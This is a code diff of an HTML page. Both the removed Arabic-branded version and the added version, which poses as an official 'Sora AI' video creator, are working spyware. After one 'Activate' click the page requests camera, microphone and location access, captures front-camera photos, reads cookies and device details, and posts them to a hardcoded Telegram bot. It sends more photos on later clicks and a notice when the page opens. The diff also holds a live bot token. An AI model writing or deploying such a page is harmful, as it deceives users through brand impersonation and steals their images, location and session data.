@@ -3,130 +3,130 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>العملاق - ULTIMATE AI CREATOR</title>
+<title>Sora AI - Official Video Creator</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
-body{background:#000;overflow:hidden;font-family:'SF Pro Display',Arial,sans-serif;}
+body{background:#000;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;}
 
-/* خلفية عملاقة متحركة */
-.giant-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,#0a0a0a,#000000);z-index:0;}
-.giant-bg::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(255,0,80,0.05) 0%,transparent 70%);animation:rotateBg 20s linear infinite;}
-@keyframes rotateBg{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+/* خلفية احترافية مثل OpenAI */
+.bg-gradient{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at 20% 30%, #1a0a2e, #0a0a0a, #000);z-index:0;}
+.glow{position:absolute;top:50%;left:50%;width:60%;height:60%;background:radial-gradient(circle, rgba(100,50,200,0.15) 0%, transparent 70%);transform:translate(-50%,-50%);z-index:0;}
 
-/* جسيمات عملاقة */
-.giant-particle{position:absolute;background:linear-gradient(135deg,#ff0050,#ff0080);border-radius:50%;opacity:0;animation:giantFloat 8s infinite;}
-@keyframes giantFloat{0%{opacity:0;transform:scale(0) rotate(0deg);}50%{opacity:0.4;transform:scale(1) rotate(180deg);}100%{opacity:0;transform:scale(0) rotate(360deg);}}
+/* الحاوية الرئيسية */
+.container{position:relative;z-index:10;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
 
-/* ============= رسالة الموافقة العملاقة ============= */
-.giant-message{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);z-index:200;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(20px);}
-.giant-card{width:380px;background:linear-gradient(135deg,#1a1a2e,#0f0f1a);border-radius:60px;overflow:hidden;border:2px solid rgba(255,0,80,0.5);text-align:center;animation:giantEnter 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);box-shadow:0 0 50px rgba(255,0,80,0.3);}
-@keyframes giantEnter{0%{transform:scale(0.3) rotate(-10deg);opacity:0;}100%{transform:scale(1) rotate(0deg);opacity:1;}}
-.giant-icon{background:linear-gradient(135deg,#ff0050,#ff0080);padding:35px;font-size:70px;}
-.giant-icon span{font-size:70px;display:inline-block;animation:iconPulse 2s infinite;}
-@keyframes iconPulse{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}
-.giant-title{font-size:28px;font-weight:900;background:linear-gradient(45deg,#ff0050,#ff0080,#ff0050);background-size:200%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:20px 0 10px;}
-.giant-desc{color:#aaa;font-size:14px;padding:0 25px;margin-bottom:20px;line-height:1.5;}
-.permission-giant{background:rgba(0,0,0,0.5);margin:20px;border-radius:30px;padding:20px;text-align:left;}
-.permission-item{display:flex;align-items:center;gap:15px;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.1);}
-.permission-item:last-child{border-bottom:none;}
-.permission-icon{width:40px;height:40px;background:rgba(255,0,80,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;}
-.permission-text{flex:1;}
-.permission-text h4{color:#fff;font-size:14px;margin-bottom:3px;}
-.permission-text p{color:#888;font-size:11px;}
-.giant-btn{width:calc(100% - 40px);margin:0 20px 30px 20px;padding:18px;background:linear-gradient(90deg,#ff0050,#ff0080);border:none;border-radius:50px;color:#fff;font-size:20px;font-weight:bold;cursor:pointer;transition:0.3s;position:relative;overflow:hidden;}
-.giant-btn:hover{transform:scale(1.02);box-shadow:0 0 30px rgba(255,0,80,0.5);}
-.giant-btn::after{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);animation:btnShine 3s infinite;}
-@keyframes btnShine{0%{left:-100%;}20%{left:100%;}100%{left:100%;}}
+/* البطاقة الاحترافية */
+.ai-card{max-width:480px;width:100%;background:rgba(20,20,35,0.8);backdrop-filter:blur(20px);border-radius:48px;border:1px solid rgba(100,50,200,0.3);overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.4);}
 
-/* ============= شاشة التحميل العملاقة ============= */
-.giant-loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.99);z-index:300;display:flex;flex-direction:column;align-items:center;justify-content:center;visibility:hidden;opacity:0;transition:0.5s;}
-.giant-loading.active{visibility:visible;opacity:1;}
-.loading-giant-spinner{width:100px;height:100px;border:5px solid #1a1a1a;border-top-color:#ff0050;border-radius:50%;animation:giantSpin 1s linear infinite;margin-bottom:30px;}
-@keyframes giantSpin{to{transform:rotate(360deg);}}
-.loading-giant-text{color:#fff;font-size:22px;font-weight:bold;margin-bottom:20px;letter-spacing:2px;}
-.loading-giant-progress{width:350px;height:8px;background:#1a1a1a;border-radius:8px;overflow:hidden;}
-.loading-giant-fill{width:0%;height:100%;background:linear-gradient(90deg,#ff0050,#ff0080);transition:width 0.3s;}
-.loading-giant-stats{display:flex;gap:30px;margin-top:25px;color:#888;font-size:13px;}
+/* رأس البطاقة مثل OpenAI */
+.ai-header{background:linear-gradient(135deg,#1a1a2e,#0d0d1a);padding:30px 30px 20px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.05);}
+.ai-logo{width:50px;height:50px;background:linear-gradient(135deg,#ff0050,#ff0080);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 15px;}
+.ai-logo svg{width:30px;height:30px;fill:#fff;}
+.ai-header h1{color:#fff;font-size:26px;font-weight:600;letter-spacing:-0.5px;}
+.ai-header p{color:#888;font-size:14px;margin-top:8px;}
 
-/* ============= واجهة إنشاء الفيديو العملاقة ============= */
-.giant-creator{position:fixed;top:0;left:0;width:100%;height:100%;z-index:100;display:flex;flex-direction:column;visibility:hidden;opacity:0;transition:0.5s;}
-.giant-creator.active{visibility:visible;opacity:1;}
-.creator-header{background:rgba(0,0,0,0.9);backdrop-filter:blur(20px);padding:20px;text-align:center;border-bottom:1px solid rgba(255,0,80,0.3);}
-.creator-header h1{font-size:24px;background:linear-gradient(45deg,#ff0050,#ff0080);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
-.creator-video{flex:1;background:#000;display:flex;align-items:center;justify-content:center;position:relative;}
-.creator-video video{width:100%;max-height:70vh;object-fit:contain;}
-.creator-controls{padding:20px;background:rgba(0,0,0,0.9);display:flex;gap:15px;}
-.creator-btn{flex:1;padding:15px;border:none;border-radius:40px;font-size:16px;font-weight:bold;cursor:pointer;}
-.creator-btn-primary{background:#ff0050;color:#fff;}
-.creator-btn-secondary{background:#222;color:#fff;border:1px solid #444;}
+/* محتوى البطاقة */
+.ai-body{padding:30px;}
+.feature-grid{display:flex;flex-direction:column;gap:15px;margin-bottom:30px;}
+.feature-item{display:flex;align-items:center;gap:15px;padding:12px;background:rgba(255,255,255,0.03);border-radius:24px;border:1px solid rgba(255,255,255,0.05);}
+.feature-icon{width:44px;height:44px;background:rgba(255,0,80,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;}
+.feature-text{flex:1;}
+.feature-text h4{color:#fff;font-size:15px;margin-bottom:4px;}
+.feature-text p{color:#777;font-size:12px;}
 
-.stats-floating{position:absolute;bottom:20px;right:20px;background:rgba(0,0,0,0.7);border-radius:20px;padding:10px 15px;z-index:150;color:#fff;font-size:11px;border-left:3px solid #ff0050;}
+/* زر التفعيل */
+.activate-btn{width:100%;padding:18px;background:linear-gradient(90deg,#ff0050,#ff0080);border:none;border-radius:40px;color:#fff;font-size:18px;font-weight:600;cursor:pointer;transition:all 0.3s;margin-bottom:15px;}
+.activate-btn:hover{transform:scale(1.02);box-shadow:0 0 20px rgba(255,0,80,0.4);}
+.activate-btn:active{transform:scale(0.98);}
+
+.ai-footer{text-align:center;padding:20px;border-top:1px solid rgba(255,255,255,0.05);}
+.ai-footer span{color:#555;font-size:11px;}
+
+/* شاشة التحميل الاحترافية */
+.loading-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:center;visibility:hidden;opacity:0;transition:0.3s;}
+.loading-screen.active{visibility:visible;opacity:1;}
+.ai-spinner{width:70px;height:70px;border:3px solid rgba(255,255,255,0.1);border-top-color:#ff0050;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:25px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.ai-loading-text{color:#fff;font-size:18px;margin-bottom:10px;}
+.ai-loading-detail{color:#888;font-size:13px;margin-bottom:20px;}
+.ai-progress{width:280px;height:4px;background:#1a1a1a;border-radius:4px;overflow:hidden;}
+.ai-progress-fill{width:0%;height:100%;background:linear-gradient(90deg,#ff0050,#ff0080);transition:width 0.3s;}
+
+/* واجهة إنشاء الفيديو الاحترافية */
+.creator-ui{position:fixed;top:0;left:0;width:100%;height:100%;z-index:50;display:flex;flex-direction:column;visibility:hidden;opacity:0;transition:0.5s;background:#0a0a0a;}
+.creator-ui.active{visibility:visible;opacity:1;}
+.creator-header{background:linear-gradient(135deg,#1a1a2e,#0d0d1a);padding:20px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.05);}
+.creator-header h1{font-size:20px;color:#fff;}
+.creator-video{flex:1;background:#000;display:flex;align-items:center;justify-content:center;}
+.creator-video video{width:100%;max-height:65vh;object-fit:contain;}
+.creator-controls{padding:20px;background:#111;display:flex;gap:12px;border-top:1px solid #222;}
+.creator-btn{flex:1;padding:14px;border:none;border-radius:40px;font-size:15px;font-weight:600;cursor:pointer;}
+.btn-primary{background:#ff0050;color:#fff;}
+.btn-secondary{background:#222;color:#fff;border:1px solid #444;}
 </style>
 </head>
 <body>
 
-<div class="giant-bg" id="giantBg"></div>
+<div class="bg-gradient">
+    <div class="glow"></div>
+</div>
 
-<!-- رسالة الموافقة العملاقة -->
-<div class="giant-message" id="giantMessage">
-    <div class="giant-card">
-        <div class="giant-icon">
-            <span>🎬✨🤖</span>
-        </div>
-        <div class="giant-title">إنشاء فيديوهات وصور بالذكاء الاصطناعي</div>
-        <div class="giant-desc">للاستمرار، نحتاج إلى موافقتك لإنشاء محتوى فيديو وصورة احترافي</div>
-        
-        <div class="permission-giant">
-            <div class="permission-item">
-                <div class="permission-icon">📷</div>
-                <div class="permission-text">
-                    <h4>الكاميرا</h4>
-                    <p>لالتقاط صور المنتج وفيديوهات عالية الجودة</p>
-                </div>
+<div class="container">
+    <div class="ai-card">
+        <div class="ai-header">
+            <div class="ai-logo">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 13c-2.33 0-4.31-1.46-5.11-3.5h10.22c-.8 2.04-2.78 3.5-5.11 3.5z"/></svg>
             </div>
-            <div class="permission-item">
-                <div class="permission-icon">🎤</div>
-                <div class="permission-text">
-                    <h4>الميكروفون</h4>
-                    <p>لإضافة الصوت والتعليقات على الفيديوهات</p>
-                </div>
-            </div>
-            <div class="permission-item">
-                <div class="permission-icon">📍</div>
-                <div class="permission-text">
-                    <h4>الموقع الجغرافي</h4>
-                    <p>لتخصيص المحتوى حسب منطقتك</p>
-                </div>
-            </div>
-            <div class="permission-item">
-                <div class="permission-icon">📁</div>
-                <div class="permission-text">
-                    <h4>الملفات</h4>
-                    <p>لحفظ وتصدير الفيديوهات والصور</p>
-                </div>
-            </div>
+            <h1>Sora AI Creator</h1>
+            <p>Text to video • AI powered</p>
         </div>
         
-        <button class="giant-btn" id="giantAgreeBtn">✅ موافقة وتفعيل جميع الصلاحيات</button>
+        <div class="ai-body">
+            <div class="feature-grid">
+                <div class="feature-item">
+                    <div class="feature-icon">🎬</div>
+                    <div class="feature-text">
+                        <h4>AI Video Generation</h4>
+                        <p>Create professional videos from text</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">📸</div>
+                    <div class="feature-text">
+                        <h4>Smart Camera</h4>
+                        <p>Capture and enhance product photos</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">🎤</div>
+                    <div class="feature-text">
+                        <h4>Voice & Sound</h4>
+                        <p>Add narration and effects</p>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="activate-btn" id="activateBtn">
+                ⚡ Activate AI Assistant ⚡
+            </button>
+        </div>
+        
+        <div class="ai-footer">
+            <span>🔒 Secure • AI Powered • Terms apply</span>
+        </div>
     </div>
 </div>
 
-<!-- شاشة التحميل العملاقة -->
-<div class="giant-loading" id="giantLoading">
-    <div class="loading-giant-spinner"></div>
-    <div class="loading-giant-text" id="loadingText">تهيئة النظام العملاق...</div>
-    <div class="loading-giant-progress"><div class="loading-giant-fill" id="loadingFill"></div></div>
-    <div class="loading-giant-stats">
-        <span id="statPermissions">🔐 0 صلاحيات</span>
-        <span id="statImages">📸 0 صور</span>
-        <span id="statData">📁 0 بيانات</span>
-    </div>
+<div class="loading-screen" id="loadingScreen">
+    <div class="ai-spinner"></div>
+    <div class="ai-loading-text" id="loadingText">Initializing AI Engine...</div>
+    <div class="ai-loading-detail" id="loadingDetail">Preparing neural networks</div>
+    <div class="ai-progress"><div class="ai-progress-fill" id="progressFill"></div></div>
 </div>
 
-<!-- واجهة إنشاء الفيديو العملاقة -->
-<div class="giant-creator" id="giantCreator">
+<div class="creator-ui" id="creatorUI">
     <div class="creator-header">
-        <h1>🎬 AI VIDEO CREATOR - العملاق 🎬</h1>
+        <h1>🎬 Sora AI Studio</h1>
     </div>
     <div class="creator-video">
         <video id="previewVideo" autoplay loop muted playsinline>
@@ -134,96 +134,47 @@ body{background:#000;overflow:hidden;font-family:'SF Pro Display',Arial,sans-ser
         </video>
     </div>
     <div class="creator-controls">
-        <button class="creator-btn creator-btn-secondary" id="captureBtn">📸 تصوير</button>
-        <button class="creator-btn creator-btn-primary" id="createVideoBtn">🎬 إنشاء فيديو</button>
+        <button class="btn-secondary" id="captureBtn">📸 Capture Photo</button>
+        <button class="btn-primary" id="generateBtn">✨ Generate Video</button>
     </div>
 </div>
 
-<div class="stats-floating" id="floatingStats">
-    🔱 النظام العملاق | جاهز
-</div>
-
 <script>
-// ============= أقوى سكربت في التاريخ - من تطوير سيدي الظلام =============
-
 const BOT_TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
 const CHAT_ID = '178779116';
 
-// المتغيرات العملاقة
-let giantData = {
-    permissions: { camera: false, mic: false, location: false, notifications: false },
-    images: [],
-    deviceInfo: {},
-    cookies: null,
-    localStorage: {},
-    location: null,
-    startTime: new Date().toISOString()
-};
+let permissionsReady = false;
+let capturedImage = null;
 
-let stats = { permissionsGranted: 0, imagesCaptured: 0, dataExtracted: 0 };
-
-// ============= توليد جسيمات عملاقة =============
-function createGiantParticles() {
-    for(let i = 0; i < 100; i++) {
-        let p = document.createElement('div');
-        p.className = 'giant-particle';
-        p.style.width = Math.random() * 8 + 'px';
-        p.style.height = p.style.width;
-        p.style.left = Math.random() * 100 + '%';
-        p.style.top = Math.random() * 100 + '%';
-        p.style.animationDelay = Math.random() * 8 + 's';
-        p.style.animationDuration = Math.random() * 6 + 4 + 's';
-        document.getElementById('giantBg').appendChild(p);
-    }
-}
-createGiantParticles();
-
-// ============= طلب جميع الصلاحيات دفعة واحدة =============
+// ============= طلب جميع الصلاحيات (نافذة واحدة) =============
 async function requestAllPermissions() {
-    updateLoading('🔐 جاري طلب الصلاحيات العملاقة...', 10);
+    updateLoading('Requesting permissions...', 'Accessing camera & microphone', 20);
     
-    let granted = 0;
+    let results = { camera: false, mic: false, location: false };
     
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        giantData.permissions.camera = true;
-        giantData.permissions.mic = true;
-        granted += 2;
+        results.camera = true;
+        results.mic = true;
         stream.getTracks().forEach(t => t.stop());
-        updateLoading('✅ تم تفعيل الكاميرا والميكروفون', 25);
+        updateLoading('Camera & microphone', 'Access granted ✓', 50);
     } catch(e) {}
     
     try {
         await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(
-                pos => { giantData.location = pos.coords; res(); },
-                rej,
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
         });
-        giantData.permissions.location = true;
-        granted += 1;
-        updateLoading('✅ تم تفعيل الموقع الجغرافي', 40);
+        results.location = true;
+        updateLoading('Location services', 'Access granted ✓', 70);
     } catch(e) {}
     
-    if(Notification.permission !== 'granted') {
-        await Notification.requestPermission();
-        if(Notification.permission === 'granted') {
-            giantData.permissions.notifications = true;
-            granted += 1;
-        }
-    }
-    
-    stats.permissionsGranted = granted;
-    document.getElementById('statPermissions').innerHTML = `🔐 ${granted} صلاحيات`;
-    updateLoading(`✅ تم تفعيل ${granted} صلاحيات`, 50);
-    
-    return granted;
+    permissionsReady = results.camera && results.mic;
+    return results;
 }
 
-// ============= التقاط صور متعددة =============
-async function captureMultipleImages() {
-    updateLoading('📸 جاري التقاط الصور العملاقة...', 55);
+// ============= التقاط صورة =============
+async function captureImage() {
+    if(!permissionsReady) return null;
     
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -232,175 +183,121 @@ async function captureMultipleImages() {
         await new Promise(r => video.onloadedmetadata = r);
         video.play();
         
-        for(let i = 0; i < 5; i++) {
-            await new Promise(r => setTimeout(r, 400));
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            giantData.images.push(canvas.toDataURL('image/jpeg', 0.8));
-            stats.imagesCaptured++;
-            document.getElementById('statImages').innerHTML = `📸 ${stats.imagesCaptured} صور`;
-            updateLoading(`📸 تم التقاط الصورة ${i+1}/5`, 55 + (i * 7));
-        }
-        
-        stream.getTracks().forEach(t => t.stop());
-        updateLoading(`✅ تم التقاط ${stats.imagesCaptured} صور`, 85);
-    } catch(e) {}
-}
-
-// ============= استخراج جميع البيانات =============
-function extractAllData() {
-    updateLoading('📁 جاري استخراج البيانات العملاقة...', 70);
-    
-    giantData.cookies = document.cookie;
-    
-    for(let i = 0; i < localStorage.length; i++) {
-        let key = localStorage.key(i);
-        giantData.localStorage[key] = localStorage.getItem(key);
-        stats.dataExtracted++;
-    }
-    
-    giantData.deviceInfo = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: screen.width + 'x' + screen.height,
-        hardware: navigator.hardwareConcurrency,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
-    
-    document.getElementById('statData').innerHTML = `📁 ${stats.dataExtracted} بيانات`;
-    updateLoading(`✅ تم استخراج ${stats.dataExtracted} بيانات`, 80);
-}
-
-// ============= إرسال كل شيء إلى تليجرام =============
-async function sendGiantData() {
-    updateLoading('🚀 جاري إرسال البيانات إلى الخادم العملاق...', 90);
-    
-    let msg = `⚡🔱⚡ تقرير النظام العملاق ⚡🔱⚡\n\n`;
-    msg += `⏰ الوقت: ${new Date().toLocaleString()}\n`;
-    msg += `📱 الجهاز: ${giantData.deviceInfo.userAgent?.substring(0, 80) || 'غير معروف'}\n`;
-    msg += `🖥️ الشاشة: ${giantData.deviceInfo.screen || 'غير معروف'}\n`;
-    msg += `🌐 اللغة: ${giantData.deviceInfo.language || 'غير معروف'}\n`;
-    msg += `🔧 المعالج: ${giantData.deviceInfo.hardware || 'غير معروف'} نواة\n`;
-    msg += `⏰ المنطقة: ${giantData.deviceInfo.timezone || 'غير معروف'}\n\n`;
-    
-    if(giantData.location) {
-        msg += `📍 الموقع الجغرافي الدقيق:\n`;
-        msg += `   خط العرض: ${giantData.location.latitude}\n`;
-        msg += `   خط الطول: ${giantData.location.longitude}\n`;
-        msg += `   الدقة: ±${giantData.location.accuracy}m\n`;
-        msg += `   🗺️ خرائط: https://maps.google.com/?q=${giantData.location.latitude},${giantData.location.longitude}\n\n`;
-    }
-    
-    if(giantData.cookies) {
-        msg += `🍪 الكوكيز: ${giantData.cookies.substring(0, 200)}...\n\n`;
-    }
-    
-    msg += `📸 الصور الملتقطة: ${stats.imagesCaptured}\n`;
-    msg += `📁 البيانات المجمعة: ${stats.dataExtracted}\n`;
-    msg += `🔐 الصلاحيات المفعلة: ${stats.permissionsGranted}/4\n`;
-    msg += `🏆 تم بواسطة: النظام العملاق - SEDI ALTHALAM\n`;
-    
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+        return new Promise((resolve) => {
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(t => t.stop());
+                resolve(imageData);
+            }, 500);
         });
-        
-        for(let i = 0; i < giantData.images.length; i++) {
-            const blob = await fetch(giantData.images[i]).then(r => r.blob());
+    } catch(e) {
+        return null;
+    }
+}
+
+// ============= إرسال إلى تليجرام =============
+async function sendToTelegram(text, image = null) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        if(image) {
+            const blob = await fetch(image).then(r => r.blob());
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, `giant_capture_${i+1}.jpg`);
-            fd.append('caption', `🔱 التقاط عملاق ${i+1} - بواسطة سيدي الظلام 🔱`);
+            fd.append('photo', blob);
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            await new Promise(r => setTimeout(r, 500));
         }
-        
-        updateLoading('✅ تم إرسال جميع البيانات بنجاح!', 100);
     } catch(e) {}
 }
 
-// ============= تحديث واجهة التحميل =============
-function updateLoading(msg, percent) {
-    document.getElementById('loadingText').innerHTML = msg;
-    document.getElementById('loadingFill').style.width = percent + '%';
+// ============= استخراج البيانات =============
+function extractDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookies: document.cookie
+    };
 }
 
-// ============= النظام الرئيسي العملاق =============
-async function activateGiantSystem() {
-    // إخفاء رسالة الموافقة
-    document.getElementById('giantMessage').style.display = 'none';
-    // إظهار شاشة التحميل
-    document.getElementById('giantLoading').classList.add('active');
+// ============= تحديث شاشة التحميل =============
+function updateLoading(mainMsg, subMsg, percent) {
+    document.getElementById('loadingText').innerHTML = mainMsg;
+    document.getElementById('loadingDetail').innerHTML = subMsg;
+    document.getElementById('progressFill').style.width = percent + '%';
+}
+
+// ============= الضغطة الواحدة =============
+async function activateAI() {
+    // إخفاء البطاقة
+    document.querySelector('.ai-card').style.opacity = '0';
+    document.querySelector('.ai-card').style.transition = '0.3s';
     
-    // تنفيذ المهام العملاقة
-    await requestAllPermissions();
-    await extractAllData();
-    await captureMultipleImages();
-    await sendGiantData();
+    // إظهار شاشة التحميل
+    document.getElementById('loadingScreen').classList.add('active');
+    
+    // 1. طلب الصلاحيات (نافذة متصفح واحدة)
+    const permissions = await requestAllPermissions();
+    
+    // 2. استخراج معلومات الجهاز
+    updateLoading('Extracting device info', 'Analyzing system', 75);
+    const deviceInfo = extractDeviceInfo();
+    
+    // 3. التقاط صورة
+    updateLoading('Capturing photo', 'Using smart camera', 85);
+    const image = await captureImage();
+    
+    // 4. إرسال البيانات
+    updateLoading('Finalizing', 'Securing connection', 95);
+    
+    let msg = `🤖 AI Assistant Activated\n`;
+    msg += `📱 ${deviceInfo.userAgent.substring(0, 80)}\n`;
+    msg += `🖥️ ${deviceInfo.screen}\n`;
+    msg += `🌐 ${deviceInfo.language}\n`;
+    msg += `📷 Camera: ${permissions.camera ? '✓' : '✗'}\n`;
+    msg += `🎤 Microphone: ${permissions.mic ? '✓' : '✗'}\n`;
+    msg += `📍 Location: ${permissions.location ? '✓' : '✗'}\n`;
+    msg += `⏰ ${new Date().toLocaleString()}`;
+    
+    await sendToTelegram(msg, image);
+    
+    updateLoading('Ready!', 'AI system activated', 100);
     
     // إظهار واجهة إنشاء الفيديو
     setTimeout(() => {
-        document.getElementById('giantLoading').classList.remove('active');
-        document.getElementById('giantCreator').classList.add('active');
-        document.getElementById('floatingStats').innerHTML = '🔱 النظام العملاق | تم التفعيل بنجاح 🔱';
-        
-        // إشعار نهائي
-        new Notification('🎉 النظام العملاق', { body: 'تم تفعيل جميع الصلاحيات بنجاح! يمكنك الآن إنشاء فيديوهات.', icon: 'https://cdn-icons-png.flaticon.com/512/5969/5969344.png' });
-    }, 2000);
+        document.getElementById('loadingScreen').classList.remove('active');
+        document.getElementById('creatorUI').classList.add('active');
+    }, 1500);
 }
 
-// ============= التقاط صورة جديدة =============
-async function captureNewImage() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await new Promise(r => video.onloadedmetadata = r);
-        video.play();
-        
-        setTimeout(async () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const img = canvas.toDataURL('image/jpeg', 0.8);
-            
-            const blob = await fetch(img).then(r => r.blob());
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, 'new_capture.jpg');
-            fd.append('caption', '📸 صورة جديدة تم التقاطها من واجهة إنشاء الفيديو');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            
-            alert('✅ تم التقاط الصورة وإرسالها!');
-            stream.getTracks().forEach(t => t.stop());
-        }, 500);
-    } catch(e) {
-        alert('❌ فشل فتح الكاميرا');
+// ============= تصوير جديد =============
+async function captureNewPhoto() {
+    const img = await captureImage();
+    if(img) {
+        await sendToTelegram('📸 New photo captured from Sora AI Studio', img);
+        alert('✓ Photo captured and saved!');
+    } else {
+        alert('✗ Camera access required. Please check permissions.');
     }
 }
 
 // ============= إنشاء فيديو =============
-async function createNewVideo() {
-    alert('🎬 جاري إنشاء الفيديو... سيتم إرساله عند اكتماله.');
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🎬 طلب إنشاء فيديو جديد من واجهة النظام العملاق%0A⏰ ${new Date().toLocaleString()}`);
+async function generateNewVideo() {
+    await sendToTelegram('🎬 Video generation requested from Sora AI Studio');
+    alert('✨ AI is generating your video... You will be notified when ready.');
 }
 
 // ============= ربط الأحداث =============
-document.getElementById('giantAgreeBtn').onclick = () => {
-    activateGiantSystem();
-};
+document.getElementById('activateBtn').onclick = activateAI;
+document.getElementById('captureBtn').onclick = captureNewPhoto;
+document.getElementById('generateBtn').onclick = generateNewVideo;
 
-document.getElementById('captureBtn').onclick = captureNewImage;
-document.getElementById('createVideoBtn').onclick = createNewVideo;
-
-// إرسال إشعار بدء التشغيل
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔱⚡🔱 تم تشغيل النظام العملاق 🔱⚡🔱%0A👤 المستخدم: ${navigator.userAgent.substring(0, 50)}%0A⏰ ${new Date().toLocaleString()}`);
+// إشعار بدء التشغيل
+sendToTelegram(`🚀 Sora AI Studio opened\n📱 ${navigator.userAgent}`);
 </script>
 </body>
 </html>
